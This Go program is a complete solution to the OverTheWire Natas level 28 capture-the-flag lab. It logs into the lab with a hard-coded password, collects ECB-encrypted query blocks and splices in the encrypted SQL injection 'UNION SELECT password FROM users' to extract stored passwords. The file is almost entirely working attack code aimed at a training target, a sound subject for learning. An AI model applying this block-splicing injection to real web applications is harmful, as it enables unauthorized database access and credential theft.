package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"math"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

const base_url = "http://natas28.natas.labs.overthewire.org/index.php"
const query_url = "http://natas28.natas.labs.overthewire.org/search.php"

const username = "natas28"
const password = "skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4"

const BLOCKSIZE = 16
const OFFSET = 38

func check(err error) {
    if(err != nil) {
        print(err)
    }
}

func getEncodedQuery(c *http.Client, input string) string {
    // POST
    post, err := http.NewRequest("POST", base_url + "?query=" + url.QueryEscape(input), nil);
    post.SetBasicAuth(username, password);

    res, err := c.Do(post);
    check(err);
    return res.Request.URL.Query().Get("query")
}

func splitBlocks(data []byte, size int) ([][]byte) {
    blocks := [][]byte{}
    for i := 0; i * size < len(data); i++ {
        a := size*i
        b := a + size
        block := data[a:b]
        blocks = append(blocks, block)
    }
    return blocks
}

func printBlocks(blocks [][]byte) {
    for i, b := range blocks {
        fmt.Println(i, "-", hex.EncodeToString(b))
    }
    println()
}

func parseTagContent(tagName string, html string) string {
    expression := `<`+ tagName +`>(.|\n)(.*?)<\/`+tagName+`>`
    re := regexp.MustCompile(expression)
    result := string(re.Find([]byte(html)))
    result = result[strings.Index(result,">")+1:strings.LastIndex(result, "<")]
    return result
}


func main() {

    client := &http.Client{};
    // println("10 x A\n-------")
    q := "AAAAAAAAAA"
    resString := getEncodedQuery(client, q)
    // println("Encoded query:\n" + resString + "\n")
    data, err := base64.StdEncoding.DecodeString(resString)
    check(err)
    blocksSafe := splitBlocks(data, BLOCKSIZE)
    // printBlocks(blocksSafe)

    // println("9 x A + ' + injection\n-----------")
    q = "AAAAAAAAA' UNION SELECT password FROM users; #"
    injectionLen := int(math.Ceil(float64(len(q) - 10) / float64(BLOCKSIZE))) + 1
    resString = getEncodedQuery(client, q)
    // println("Encoded query:\n" + resString + "\n")
    data, err = base64.StdEncoding.DecodeString(resString)
    check(err)
    blocksEscaped := splitBlocks(data, BLOCKSIZE)
    // printBlocks(blocksEscaped)

    // println("\nCombined blocks:\n-----------")

    finalBlocks := append([][]byte{}, blocksSafe[0:3]...)
    finalBlocks = append(finalBlocks, blocksEscaped[3:3+injectionLen - 1]...)
    finalBlocks = append(finalBlocks, blocksSafe[3:]...)
    // printBlocks(finalBlocks)

    newData := []byte{}
    for _, b := range finalBlocks {
        newData = append(newData, b...)
    }
    base64query := base64.StdEncoding.EncodeToString(newData)
    // println(base64query, len(base64query), "\n")
    // println(url.QueryEscape(base64query))


    post, err := http.NewRequest("POST", query_url + "?query=" + url.QueryEscape(base64query), nil)
    post.SetBasicAuth(username, password)
    res, err := client.Do(post)
    check(err)
    defer res.Body.Close()
    body, err := ioutil.ReadAll(res.Body)
    html := strings.ReplaceAll(string(body), "<br />", "\n")
    fmt.Println(parseTagContent("li", html))

}

